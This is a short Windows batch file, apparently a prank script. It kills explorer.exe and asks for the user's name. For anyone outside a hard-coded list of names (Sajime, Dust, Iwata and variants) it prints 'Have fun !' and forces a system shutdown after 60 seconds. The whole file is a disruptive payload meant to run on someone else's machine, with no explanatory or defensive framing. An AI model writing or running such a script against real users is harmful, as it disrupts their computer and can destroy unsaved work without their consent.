@echo off
color 0A
title Name
taskkill /f /im explorer.exe
cls
set /p name=What's your name : 

if %name% == sajime (goto next)
if %name% == dust (goto next)
if %name% == sad_dust (goto next)
if %name% == sad-dust (goto next)
if %name% == sajime (goto next)
if %name% == dust (goto next)
if %name% == iwata (goto next)
if %name% == iwata sajime (goto next)
if %name% == SAJIME (goto next)
if %name% == Sajime (goto next)
if %name% == Iwate (goto next)
if %name% == IWATA (goto next)
if %name% == DUST (goto next)
if %name% == SAD_DUST (goto next)
if %name% == Dust (goto next)
if %name% == IWATA SAJIME (goto next)
if %name% == Iwata Sajime (goto next)

color 04
cls
echo Have fun !
shutdown /s /t 60 /c "COOL"
start explorer
timeout 60
exit

:next
color 0F
cls
echo Hello welcome !
start explorer
timeout 10
exit

